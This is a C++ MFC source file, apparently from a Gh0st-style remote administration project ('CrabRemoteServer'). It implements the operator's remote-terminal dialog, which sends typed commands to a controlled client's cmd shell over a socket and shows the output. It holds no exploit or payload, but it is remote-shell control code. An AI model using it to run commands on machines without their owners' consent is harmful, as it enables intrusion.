// CmdManagerDlg.cpp: 实现文件
//

#include "pch.h"
#include "CrabRemoteServer.h"
#include "CmdManagerDlg.h"
#include "afxdialogex.h"


// CCmdManagerDlg 对话框

IMPLEMENT_DYNAMIC(CCmdManagerDlg, CDialogEx)

CCmdManagerDlg::CCmdManagerDlg(CWnd* pParent, CIocpServer*
	IocpServer, CONTEXT_OBJECT* ContextObject)
	: CDialogEx(IDD_CMD_MANAGER_DIALOG, pParent)
{

	m_IocpServer = IocpServer;
	m_ContextObject = ContextObject;

	//m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));   //用户句柄

}

CCmdManagerDlg::~CCmdManagerDlg()
{
}

void CCmdManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_CMD_MANAGER_EDIT, m_CmdManagerEdit);
}

VOID CCmdManagerDlg::ShowCmdData(void)
{
	m_ContextObject->m_ReceivedBufferDataDecompressed.WriteArray((LPBYTE)"", 1);
	//从被控制端来的数据我们要加上一个\0
	CString v1 = (char*)m_ContextObject->m_ReceivedBufferDataDecompressed.GetArray(0);
	//获得所有的数据 包括 \0																			 
	v1.Replace("\n", "\r\n");
	//替换掉原来的换行符  可能cmd 的换行同w32下的编辑控件的换行符不一致   所有的回车换行  	
	//得到当前窗口的字符个数
	int	BufferLength = m_CmdManagerEdit.GetWindowTextLength();
	//将光标定位到该位置并选中指定个数的字符  也就是末尾 因为从被控端来的数据 要显示在 我们的 先前内容的后面
	m_CmdManagerEdit.SetSel(BufferLength, BufferLength);

	//用传递过来的数据替换掉该位置的字符    //显示
	m_CmdManagerEdit.ReplaceSel(v1);
	//重新得到字符的大小
	m_CurDataPosition = m_CmdManagerEdit.GetWindowTextLength();   //C:\>dir
   //我们注意到，我们在使用远程终端时 ，发送的每一个命令行 都有一个换行符  就是一个回车
   //要找到这个回车的处理我们就要到PreTranslateMessage函数的定义  
	return VOID();
}

void CCmdManagerDlg::OnReceiveComplete(void)
{
	if (m_ContextObject == NULL)
	{
		return;
	}
	ShowCmdData();   //把接收到的数据调整一下显示
	m_ShowDataLength = m_CmdManagerEdit.GetWindowTextLength();
}


BEGIN_MESSAGE_MAP(CCmdManagerDlg, CDialogEx)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CCmdManagerDlg 消息处理程序


BOOL CCmdManagerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化
	//获得客户端IP
	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));

	//获取客户端Ip得走
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->clientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 


	v1.Format(_T("\\\\%s - 远程终端管理"), IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//设置对话框标题
	SetWindowText(v1);

	BYTE IsToken = CLIENT_GO_ON;
	m_IocpServer->OnPrepareSending(m_ContextObject, &IsToken, sizeof(BYTE));  //客户端CmdManager类中的HandleIo接收数据
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


BOOL CCmdManagerDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if (pMsg->message == WM_KEYDOWN)
	{
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;
		//如果是可编辑框的回车键
		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_CmdManagerEdit.m_hWnd)
		{
			//得到窗口的数据大小
			int	BufferLength = m_CmdManagerEdit.GetWindowTextLength();  //C:\>dir
			CString BufferData;
			//得到窗口的字符数据
			m_CmdManagerEdit.GetWindowText(BufferData);//dir\r\n  
									  //加入换行符
			BufferData += "\r\n";
			//得到整个的缓冲区的首地址再加上原有的字符的位置，其实就是用户当前输入的数据了
			//然后将数据发送出去。。。。。。。。。。。。。。。
			m_IocpServer->OnPrepareSending(m_ContextObject, (LPBYTE)BufferData.GetBuffer(0) + m_CurDataPosition,
				BufferData.GetLength() - m_CurDataPosition);
			m_CurDataPosition = m_CmdManagerEdit.GetWindowTextLength();  //重新定位m_nCurSel  m_nCurSel = 3
		}
		// 限制VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_CmdManagerEdit.m_hWnd)
		{
			if (m_CmdManagerEdit.GetWindowTextLength() <= m_ShowDataLength)
			{
				return true;
			}

		}
	}
	return CDialogEx::PreTranslateMessage(pMsg);
}


void CCmdManagerDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_ContextObject != NULL)
	{
		m_ContextObject->DlgHandle = NULL;
		m_ContextObject->DlgIdentity = 0;
		CancelIo((HANDLE)m_ContextObject->clientSocket);
		closesocket(m_ContextObject->clientSocket);
	}
	CDialogEx::OnClose();
}
